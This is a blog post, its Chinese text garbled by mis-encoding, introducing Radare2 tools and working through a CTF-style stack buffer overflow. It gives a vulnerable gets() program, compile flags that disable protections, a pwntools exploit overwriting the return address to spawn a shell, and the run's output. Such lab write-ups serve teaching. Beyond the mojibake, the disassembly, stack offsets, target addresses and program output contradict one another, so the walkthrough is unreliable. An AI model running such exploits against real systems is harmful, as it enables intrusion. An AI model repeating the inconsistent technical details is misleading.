<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Post4_Radare ä½¿ç”¨è®°å½• | Dashjay&#39;s</title>
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    <link rel="stylesheet" href="/css/theme-override.css">
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0-rc.1/dist/katex.min.css" integrity="sha384-D+9gmBxUQogRLqvARvNLmA9hS2x//eK1FhVb9PiU86gmcrBrJAQT8okdJ4LMp2uv" crossorigin="anonymous">
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0-rc.1/dist/katex.min.js" integrity="sha384-483A6DwYfKeDa0Q52fJmxFXkcPCFfnXMoXblOkJ4JcA8zATN6Tm78UNL72AKk+0O" crossorigin="anonymous"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0-rc.1/dist/contrib/auto-render.min.js" integrity="sha384-yACMu8JWxKzSp/C1YV86pzGiQ/l1YUfE8oPuahJQxzehAjEt2GiQuy/BIvl9KyeF" crossorigin="anonymous"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            renderMathInElement(document.body);
        });
    </script>

<header>

  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>
  <nav>
    <ul>
      
      
      <li class="pull-left ">
        <a href="/">/home/dashjay&#39;s</a>
      </li>
      
      
      <li class="pull-left ">
        <a href="/">~/home</a>
      </li>
      
      
      <li class="pull-left ">
        <a href="/categories/">~/categories</a>
      </li>
      
      
      <li class="pull-left ">
        <a href="/tags/">~/tags</a>
      </li>
      

      
      
      <li class="pull-right">
        <a href="/index.xml">~/subscribe</a>
      </li>
      

    </ul>
  </nav>
</header>

  </head>

  <body>
    <br/>

<div class="article-meta">
<h1><span class="title">Post4_Radare ä½¿ç”¨è®°å½•</span></h1>
<h2 class="author">dashjay</h2>
<h2 class="date">2019/12/11</h2>
<p class="terms">
  
  
  
  
  
</p>
</div>



<main>
<p>[toc]</p>
<h2 id="4">æŠ¥å‘Š4</h2>
<p>é€‰æ‹©äº§å“ï¼šRadare2å–è¯å·¥å…·</p>
<h4 id="heading">å·¥å…·ä»‹ç»</h4>
<p><a href="https://github.com/radare/radare2"><strong>Radare</strong></a>æ˜¯ä¸€ä¸ªå–è¯å·¥å…·ä»¥åŠå¯ç¼–å†™è„šæœ¬çš„å‘½ä»¤è¡Œåå…­è¿›åˆ¶ç¼–è¾‘å™¨ï¼Œå¯ä»¥æ‰“å¼€ç£ç›˜æ–‡ä»¶ã€æ”¯æŒåˆ†æäºŒè¿›åˆ¶ã€åæ±‡ç¼–ä»£ç ã€è°ƒè¯•ç¨‹åºä»¥åŠè¿æ¥åˆ°è¿œç¨‹gdbæœåŠ¡æœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œæˆ‘è®°å¾—æˆ‘é«˜ä¸­çš„æ—¶å€™è¿™å·¥å…·æ›¾è¿›è¿‡Github TOP 30ï¼Œä½†æ˜¯ç”±äºå„ç§åŸå› ï¼Œæˆ‘ä»¬å¹³æ—¶éƒ½ä½¿ç”¨GDBï¼Œä¹Ÿå°±å¿½ç•¥äº†è¿™ä¸ªå·¥å…·ï¼Œçœ‹åˆ°å®ƒè¢«å®šä¹‰ä¸ºå–è¯å·¥å…·çš„æ—¶å€™æˆ‘æœ‰ç‚¹å¥½å¥‡ï¼Œä»€ä¹ˆæ˜¯è®¡ç®—æœºå–è¯&hellip;&hellip;..ä¸‹é¢è´´ä¸€ä¸‹manæ‰‹å†Œä¸­r2çš„æè¿°</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
RADARE2<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                BSD General Commands Manual               RADARE2<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>

NAME
     radare2 -- Advanced commandline hexadecimal editor, disassembler and
     debugger
</code></pre></div><h4 id="heading-1">åŠŸèƒ½æµ‹è¯•</h4>
<p>ä¼—æ‰€å‘¨çŸ¥GDBå¯ä»¥è¿è¡Œæ—¶ï¼ˆruntimeï¼‰åˆ†æï¼Œä½†æ˜¯R2åªæ˜¯ä¸€ä¸ªé™æ€åˆ†æçš„è½¯ä»¶ï¼Œè®©æˆ‘æ¥çœ‹çœ‹ä»–æœ‰å¤šå¼ºå¤§ï¼Œå…ˆåˆ†æä¸€å°æ®µä»£ç çœ‹çœ‹ã€‚</p>
<p>è¿™ä¸ªè½¯ä»¶é›†æˆäº†è®¸å¤šå°å·¥å…·ï¼Œçœ‹æ¥å¹³æ—¶å†™pythonå°å·¥å…·çš„æ—¶ä»£ç»“æŸäº†ï¼Œè¿™ä¹ˆå¤šé™„å¸¦çš„å°å·¥å…·æˆ‘æ¥ä»‹ç»ä¸‹ã€‚</p>
<h5 id="rax2-----------">rax2 &mdash;&mdash;&mdash;&gt; ç”¨äºæ•°å€¼è½¬æ¢</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$rax2 -s <span style="color:#ae81ff">414141</span>
AAAA%
</code></pre></div><p>çœ‹ä¸‹manæ‰‹å†Œä»‹ç»</p>
<pre><code>
RAX2(1)                   BSD General Commands Manual                  RAX2(1)

NAME
     rax2 -- radare base converter
DESCRIPTION
     This command is part of the radare project.
     
     This command allows you to convert values between positive and negative integer, float, octal, binary and hexadecimal values.
</code></pre><p>è¿™ä¸ªå°å·¥å…·å¯ä»¥æ­£è´Ÿï¼Œæ•´æ•°ï¼Œæµ®ç‚¹æ•°ï¼Œåè¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ç­‰ä¹‹é—´ç›¸äº’è½¬æ¢ã€‚</p>
<h5 id="rasm2---------">rasm2 &mdash;&mdash;-&gt; åæ±‡ç¼–å’Œæ±‡ç¼–</h5>
<h5 id="rabin2---------">rabin2 &mdash;&mdash;-&gt; æŸ¥çœ‹æ–‡ä»¶æ ¼å¼(å…¶å®æˆ‘å°±åªæ˜¯ç”¨æ¥çœ‹å­—ç¬¦ä¸²)</h5>
<p>æœ‰æ—¶å€™ç”¨è¿™ç§æ–¹æ³•å¯ä»¥å¿«é€Ÿè·å¾—flagï¼Œæˆ‘è¯´çš„æ˜¯ç­¾åˆ°é¢˜ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">2017</span> â—¯ : rabin2 -zz forkc | grep <span style="color:#e6db74">&#34;TEXT.&#34;</span>
<span style="color:#ae81ff">022</span> 0x00000ed2 0x100000ed2   <span style="color:#ae81ff">4</span>   <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>0.__TEXT.__text<span style="color:#f92672">)</span>  utf8 1<span style="color:#ae81ff">\t</span>Ç‰E blocks<span style="color:#f92672">=</span>Basic Latin,Latin Extended-B
<span style="color:#ae81ff">023</span> 0x00000f7c 0x100000f7c  <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">14</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii my pid is %d<span style="color:#ae81ff">\n</span>
<span style="color:#ae81ff">024</span> 0x00000f8a 0x100000f8a  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">12</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii fork failed
<span style="color:#ae81ff">025</span> 0x00000f96 0x100000f96   <span style="color:#ae81ff">7</span>   <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii /bin/ps
<span style="color:#ae81ff">026</span> 0x00000fa1 0x100000fa1  <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">15</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii child complete
</code></pre></div><h5 id="radiff2---------diff">radiff2 &mdash;&mdash;&gt; å¯¹æ–‡ä»¶è¿›è¡Œ diff</h5>
<h5 id="ragg2ragg2">ragg2/ragg2­cc &mdash;&mdash;&gt; ç”¨äºæ›´æ–¹ä¾¿çš„ç”Ÿæˆshellcode</h5>
<h5 id="rahash2---------hash">rahash2 &mdash;&mdash;&gt; å„ç§å¯†ç ç®—æ³•ï¼Œ hashç®—æ³•</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$rahash2 -s I_LOVE_OUC -j
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;sha256&#34;</span>,<span style="color:#e6db74">&#34;hash&#34;</span>:<span style="color:#e6db74">&#34;0417b096e02a7c452bd7e9d0b4ff0b3322edf4b4b8e3eb434a9d9a072aa1c21c&#34;</span><span style="color:#f92672">}</span>%
</code></pre></div><p>ä»¥ä¸Šå·¥å…·éƒ½æ˜¯ä»–é™„å¸¦çš„ä¸€äº›å·¥å…·ï¼Œæœ€ä¸»è¦çš„ç¨‹åºå«åšRadare2ï¼Œæ˜¯ä¸€ä¸ªåæ±‡ç¼–ï¼Œçš„é™æ€åˆ†æçš„ç¥å™¨ã€‚ä½¿ç”¨è¿™ä¸ªå·¥å…·çš„åŸå› ä¸€æ–¹é¢æ˜¯è‡ªå·±èƒ½åŠ›ä¸è¶³ï¼Œå¦ä¸€æ–¹é¢æ˜¯CTFåšé¢˜çœŸçš„æ˜¯æ¥ä¸åŠï¼Œä½¿ç”¨è¿™ä¸ªç¨‹åºå¯ä»¥å¤§å¤§çš„æé«˜æˆ‘åœ¨åšé¢˜çš„æ—¶å€™çš„çš„é€Ÿåº¦å’Œæ­£ç¡®æ€§</p>
<h3 id="radare2">Radare2</h3>
<p>ä¸ºäº†å±•ç¤ºè¿™ä¸ªç¨‹åºçš„å‰å®³æˆ‘ä»ç½‘ä¸Šçœ‹åˆ°äº†ä¸€ä¸ªå°å®éªŒï¼Œä¸Šä¸€æ®µä»£ç </p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwn</span>(){
    system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>(){
    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">32</span>];
    gets(buffer);
    <span style="color:#66d9ef">return</span>;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
    vulnerable();
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>æŒ‰ç…§å¸¸ç†æ¥å°†ï¼Œ<code>/bin/sh</code>æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ï¼Œä½†æ˜¯ï¼Œå¹¶ä¸”ç¼–è¯‘å‡ºç»“æœçš„æˆ‘ä»¬æœ¬èº«æ˜¯æ— æ³•çŸ¥é“æºä»£ç çš„ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨r2æ¥æ±‡ç¼–ç </p>
<p><code>&gt; sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector </code></p>
<blockquote>
<p>é¦–å…ˆæˆ‘å…ˆä½¿ç”¨ç®¡ç†å‘˜æƒé™ç¼–è¯‘è¿™ä¸ªä»£ç ï¼Œè¿™é‡Œä½¿ç”¨sudoåªæ˜¯ä¸ºäº†å°†ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶çš„ownerè®¾ç½®ä¸ºroot,å½“ä½ ä»¥æ™®é€šèº«ä»½ææƒåå¯æ˜¯è·å¾—rootæƒé™</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">root<span style="color:#960050;background-color:#1e0010">@</span>Aurora:<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>code<span style="color:#f92672">/</span>pwn<span style="color:#f92672">/</span>challenge<span style="color:#f92672">/</span><span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">#</span> sudo gcc <span style="color:#f92672">-</span>o a buffer.c <span style="color:#f92672">-</span>no<span style="color:#f92672">-</span>pie <span style="color:#f92672">-</span>m32 <span style="color:#f92672">-</span>fno<span style="color:#f92672">-</span>stack<span style="color:#f92672">-</span>protector 
buffer.c: In function <span style="color:#960050;background-color:#1e0010">â€˜</span>vulnerable<span style="color:#960050;background-color:#1e0010">â€™</span><span style="color:#f92672">:</span>
buffer.c:<span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> warning: implicit declaration of function <span style="color:#960050;background-color:#1e0010">â€˜</span>gets<span style="color:#960050;background-color:#1e0010">â€™</span>; did you mean <span style="color:#960050;background-color:#1e0010">â€˜</span>fgets<span style="color:#960050;background-color:#1e0010">â€™</span><span style="color:#f92672">?</span> [<span style="color:#f92672">-</span>Wimplicit<span style="color:#f92672">-</span>function<span style="color:#f92672">-</span>declaration]
     gets(buffer);
     <span style="color:#f92672">^</span><span style="color:#f92672">~</span><span style="color:#f92672">~</span><span style="color:#f92672">~</span>
     fgets
<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>ld: <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>ccQDe6dj.o: in function <span style="color:#960050;background-color:#1e0010">`</span>vulnerable<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">:</span>
buffer.c:(.text<span style="color:#f92672">+</span><span style="color:#ae81ff">0x97</span>)<span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">è­¦</span><span style="color:#960050;background-color:#1e0010">å‘Š</span><span style="color:#960050;background-color:#1e0010">ï¼š</span>the <span style="color:#960050;background-color:#1e0010">`</span>gets<span style="color:#960050;background-color:#1e0010">&#39;</span> function is dangerous and should not be used.
</code></pre></div><p>å¯è§getsæœ¬èº«æ˜¯ä¸€ä¸ªååˆ†å±é™©çš„å‡½æ•°,ä»–ä¸ä¼šæ£€æŸ¥å­—ç¬¦ä¸²çš„é•¿åº¦,è€Œæ˜¯ä»¥å›è½¦æ¥åˆ¤æ–­è¾“å…¥æ˜¯å¦ç»“æŸ,åŠå…¶å®¹æ˜“å¼•å‘æ ˆæº¢å‡º.</p>
<p>â€ƒâ€ƒè§£é‡Šä¸€ä¸‹è¿™å‡ ä¸ªå‚æ•°çš„ä½œç”¨:</p>
<ul>
<li><code>-m32</code>:æŒ‡çš„æ˜¯ç”Ÿæˆ32ä½ç¨‹åº</li>
<li><code>-fno-stack-protector</code>:å­—é¢æ„æ€,å…³é—­æ ˆä¿æŠ¤,ä¸ç”Ÿæˆcanary</li>
<li><code>-no-pie</code>:å…³é—­pie(Position Independent Executable),è¿™ä¸ªpieå¹¶ä¸èƒ½åƒ,ä»–ä½¿ç¨‹åºçš„åœ°å€è¢«æ‰“ä¹±,å¯¼è‡´æˆ‘ä»¬æ— æ³•è¿”å›åˆ°å›ºå®šç›®æ ‡åœ°å€.</li>
</ul>
<p>â€ƒâ€ƒä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è¿è¡Œå®ƒï¼Œå¹¶ä¸”æŒ‰ä¸‹5ä¸ªaå›è½¦å¯ä»¥å¯¹ç¨‹åºè¿›è¡Œå…¨å±€åˆ†æï¼Œ</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&gt; r2 ./a
<span style="color:#f92672">[</span>0x100000f60<span style="color:#f92672">]</span>&gt;aaaaa
<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze all flags starting with sym. and entry0 <span style="color:#f92672">(</span>aa<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze <span style="color:#66d9ef">function</span> calls <span style="color:#f92672">(</span>aac<span style="color:#f92672">)</span>
......
<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Finding <span style="color:#66d9ef">function</span> preludes
<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Enable constraint types analysis <span style="color:#66d9ef">for</span> variables
</code></pre></div><p>ä½¿ç”¨&gt; s mainå¯ä»¥è·³è½¬åˆ°mainå‡½æ•°ï¼Œæ²¡æœ‰å˜åŒ–å› ä¸ºï¼Œr2ç»™ç¨‹åºæ‰¾äº†é»˜è®¤å…¥å£[0x100000f60]</p>
<pre><code>[0x100000f60]&gt;s main
[0x100000f60]&gt;pdf
</code></pre><p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªmain()å‡½æ•°:</p>
<p>ç¼–è¯‘æˆåŠŸåæˆ‘ä»¬å¯ä»¥ä½¿ç”¨checksecå·¥å…·æ£€æŸ¥ç¼–è¯‘ç”Ÿæˆçš„æ–‡ä»¶:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@Aurora:/home/code/pwn/challenge/1 <span style="color:#75715e"># checksec a</span> 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/code/pwn/challenge/1/a&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
</code></pre></div><p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªmain()å‡½æ•°:</p>
<pre><code class="language-assembly" data-lang="assembly">â”Œ (fcn) entry0 28
â”‚   entry0 ();
â”‚           ; var int32_t var_4h @ rbp-0x4
â”‚           0x100000f60      55             push rbp
â”‚           0x100000f61      4889e5         mov rbp, rsp
â”‚           0x100000f64      4883ec10       sub rsp, 0x10
â”‚           0x100000f68      c745fc000000.  mov dword [var_4h], 0
â”‚           0x100000f6f      e8ccffffff     call sym._vuln
â”‚           0x100000f74      31c0           xor eax, eax
â”‚           0x100000f76      4883c410       add rsp, 0x10
â”‚           0x100000f7a      5d             pop rbp
â””           0x100000f7b      c3             ret

</code></pre><p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯åœ¨mainå‡½æ•°ä¸­è°ƒç”¨äº†vuln</p>
<p>æˆ‘ä»¬å¯ä»¥ç»§ç»­å»çœ‹çœ‹vuln</p>
<pre><code class="language-assembly" data-lang="assembly">   sym._vuln ();
â”‚           ; var char *var_28h @ rbp-0x28
â”‚           ; var char *s @ rbp-0x20
â”‚           ; CALL XREF from entry0 (0x100000f6f)
â”‚           0x100000f40      55             push rbp
â”‚           0x100000f41      4889e5         mov rbp, rsp
â”‚           0x100000f44      4883ec30       sub rsp, 0x30              ; '0'
â”‚           0x100000f48      488d7de0       lea rdi, [s]               ; char *s
â”‚           0x100000f4c      e82b000000     call sym.imp.gets          ; char *gets(char *s)
â”‚           0x100000f51      488945d8       mov qword [var_28h], rax
â”‚           0x100000f55      4883c430       add rsp, 0x30              ; '0'
â”‚           0x100000f59      5d             pop rbp
â””           0x100000f5a      c3             ret
</code></pre><p>æœ€å…³é”®çš„ä¸¤è¡Œå°±æ˜¯ï¼Œè¿™ä¸¤è¡Œè¡¨ç¤ºï¼ŒæŠŠ<code>*s</code>è¿™ä¸ª2*16å­—èŠ‚çš„é•¿åº¦çš„å­—ç¬¦ä¸²ä¼ å…¥ rdiå¹¶ä¸”å‡†å¤‡è°ƒç”¨getsç»™ä»–èµ‹å€¼</p>
<pre><code class="language-assembly" data-lang="assembly">0x100000f48      488d7de0       lea rdi, [s]               ; char *s
0x100000f4c      e82b000000     call sym.imp.gets          ; char *gets(char *s)
</code></pre><p>æ ˆç»“æ„ç”»ä¸€ä¸‹ï¼Œå°±æ˜¯è¿™æ ·çš„ã€‚</p>
<pre><code class="language-assembly" data-lang="assembly">       																		 +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x28--&gt;+-----------------+
</code></pre><p>çœ‹ä¸€ä¸‹pwnçš„åœ°å€</p>
<pre><code class="language-assembly" data-lang="assembly">            ;-- section.0.__TEXT.__text:
            ;-- func.100000f20:
â”Œ (fcn) sym._pwn 29
â”‚   sym._pwn ();
â”‚           ; var int32_t var_4h @ rbp-0x4
â”‚           0x100000f20      55             push rbp                   ; [00] -r-x section size 92 named 0.__TEXT.__text
â”‚           0x100000f21      4889e5         mov rbp, rsp
</code></pre><p>å‘ç°æ˜¯<code>0x100000f20</code></p>
<p>å‡å¦‚æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸º:<code>0x28 * 'a' 'bbbb' + pwn_addr</code>,é‚£ä¹ˆç”±äºgetsåªæœ‰è¯»åˆ°å›è½¦æ‰åœ,æ‰€ä»¥è¿™ä¸€æ®µå­—ç¬¦ä¸²ä¼šæŠŠsaved_ebpè¦†ç›–ä¸ºbbbb,å°†ret_addrè¦†ç›–ä¸ºpwn_addr,é‚£ä¹ˆ,æ­¤æ—¶æ ˆçš„ç»“æ„ä¸º:</p>
<pre><code>                                           +-----------------+
                                           |   0x100000f20   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14--&gt;+-----------------+
</code></pre><p>æ³¨:</p>
<blockquote>
<p>å‰é¢æåˆ°,åœ¨å†…å­˜ä¸­,æ¯ä¸ªå€¼æŒ‰ç…§å­—èŠ‚å­˜å‚¨.ä¸€èˆ¬éƒ½æ˜¯æŒ‰ç…§å°ç«¯å­˜å‚¨,æ‰€ä»¥0x100000f20 åœ¨å†…å­˜ä¸­çš„å½¢å¼ä¸º</p>
</blockquote>
<p><code>\x20\x0f\x00\x00\x01</code></p>
<p>åˆ°è¿™é‡Œradare2çš„ä»»åŠ¡å·²ç»å®Œæˆäº†ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä½¿ç”¨pythonè„šæœ¬å®Œæˆè¿™ä¸ªé¢˜ç›®ã€‚</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!	/usr/bin/python2</span>
<span style="color:#75715e">#é€‰æ‹©python2è§£é‡Šå™¨</span>

<span style="color:#75715e"># -*- coding: UTF-8 -*-</span>
<span style="color:#75715e">#è®¾ç½®utf-8ç¼–ç ,ä¸ºäº†æ”¯æŒä¸­æ–‡</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  <span style="color:#75715e">#å¼•å…¥pwntoolsçš„åº“</span>

context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># å¼€å¯debugæ¨¡å¼,å¯ä»¥è®°å½•å‘é€å’Œæ”¶åˆ°çš„å­—ç¬¦ä¸²</span>

sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./a</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e">#æ„é€ ä¸ç¨‹åºäº¤äº’çš„å¯¹è±¡</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bbbb</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x08049182</span>)  <span style="color:#75715e"># æ„é€ payload</span>

sh<span style="color:#f92672">.</span>sendline(payload)  <span style="color:#75715e"># å°†å­—ç¬¦ä¸²å‘é€ç»™ç¨‹åº</span>

sh<span style="color:#f92672">.</span>interactive() <span style="color:#75715e"># å°†ä»£ç å˜ä¸ºæ‰‹åŠ¨äº¤äº’</span>

</code></pre></div><p>ç„¶åç”¨pythonè§£é‡Šå™¨è¿è¡Œè¿™ä¸ªè„šæœ¬å°±å¯ä»¥å®Œæˆpwn</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">root<span style="color:#a6e22e">@Aurora</span>:<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>code<span style="color:#f92672">/</span>pwn<span style="color:#f92672">/</span>challenge<span style="color:#f92672">/</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># ./a.py</span>
[<span style="color:#f92672">+</span>] Starting local process <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./a</span><span style="color:#e6db74">&#39;</span>: pid <span style="color:#ae81ff">10160</span>
[DEBUG] Sent <span style="color:#ae81ff">0x31</span> bytes:
    <span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#960050;background-color:#1e0010">â”‚</span>aaaa<span style="color:#960050;background-color:#1e0010">â”‚</span>aaaa<span style="color:#960050;background-color:#1e0010">â”‚</span>aaaa<span style="color:#960050;background-color:#1e0010">â”‚</span>aaaa<span style="color:#960050;background-color:#1e0010">â”‚</span>
    <span style="color:#f92672">*</span>
    <span style="color:#ae81ff">00000020</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span>  <span style="color:#ae81ff">82</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">08</span>  <span style="color:#960050;background-color:#1e0010">â”‚</span>aaaa<span style="color:#960050;background-color:#1e0010">â”‚</span>aaaa<span style="color:#960050;background-color:#1e0010">â”‚</span>bbbb<span style="color:#960050;background-color:#1e0010">â”‚</span><span style="color:#960050;background-color:#1e0010">Â·</span><span style="color:#960050;background-color:#1e0010">Â·</span><span style="color:#960050;background-color:#1e0010">Â·</span><span style="color:#960050;background-color:#1e0010">Â·</span><span style="color:#960050;background-color:#1e0010">â”‚</span>
    <span style="color:#ae81ff">00000030</span>  <span style="color:#ae81ff">0</span>a                                                  <span style="color:#960050;background-color:#1e0010">â”‚</span><span style="color:#960050;background-color:#1e0010">Â·</span><span style="color:#960050;background-color:#1e0010">â”‚</span>
    <span style="color:#ae81ff">00000031</span>
[<span style="color:#f92672">*</span>] Switching to interactive mode
[DEBUG] Received <span style="color:#ae81ff">0x33</span> bytes:
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Hello,I</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">m dyf.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">QAQ</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
